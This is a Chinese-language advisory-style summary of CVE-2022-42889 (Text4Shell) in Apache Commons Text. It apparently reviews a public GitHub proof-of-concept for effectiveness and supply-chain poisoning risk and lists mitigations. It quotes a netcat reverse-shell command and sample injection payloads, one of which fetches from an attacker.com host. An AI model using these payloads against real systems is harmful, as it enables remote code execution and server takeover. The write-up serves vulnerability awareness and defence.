## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的 Apache Commons Text，并且允许用户可控的输入传递给存在漏洞的插值函数。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个关键漏洞。该漏洞源于Apache Commons Text在处理变量插值时，默认包含了一些不安全的 StringLookup 实现，如 `script`、`dns` 和 `url`。攻击者可以通过构造包含恶意表达式的输入，利用这些 StringLookup 实现执行任意代码或与远程服务器进行交互。

**有效性：**

提供的Python POC代码尝试利用此漏洞。它通过构造包含恶意`script`查找的payload，将其作为GET请求的参数发送到目标URL。Payload中的命令`nc {args.ip} {args.port} -e {args.type}`使用netcat建立反向shell连接到攻击者的机器。如果目标系统运行着存在漏洞的Apache Commons Text版本，并且netcat可用，则此POC应有效。

**投毒风险：**

代码本身并没有明显的投毒行为。这段代码的主要目的是利用漏洞，建立反向shell。代码包含MIT许可证，表面上代码作者允许代码使用者复制、修改、合并、发布、分发、再许可和/或出售软件的副本，但并不能完全排除未来作者修改代码进行投毒行为的可能性。风险占比5%。主要考虑到以下几点：

*   **依赖netcat：** POC依赖目标系统安装了netcat。如果目标系统没有netcat，则漏洞利用会失败，但不会造成其他损害。
*   **反向Shell：**  反向Shell本身有风险，因为它允许攻击者远程访问受害者的系统。但是，这是漏洞利用本身的性质，而不是代码作者故意引入的恶意行为。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响的Apache Commons Text版本 (1.5 <= version <= 1.9)。**
2.  **找到应用程序中接受用户输入的地方，这些输入最终会被传递给 Apache Commons Text 的插值功能。**
3.  **构造包含恶意表达式的Payload，例如`${script:javascript:java.lang.Runtime.getRuntime().exec("command")}` 或 `${url:http://attacker.com/evil.txt}`。**
4.  **将Payload作为输入发送到目标应用程序。**
5.  **如果漏洞利用成功，攻击者将能够执行任意代码或与远程服务器进行交互。**

**防范措施：**

*   **升级到Apache Commons Text 1.10.0或更高版本。该版本默认禁用了不安全的StringLookup实现。**
*   **如果无法升级，可以手动禁用不安全的StringLookup实现。**
*   **验证所有用户输入，防止恶意表达式注入。**

**项目地址:** [vickyaryan7/Text4shell-exploit](https://github.com/vickyaryan7/Text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)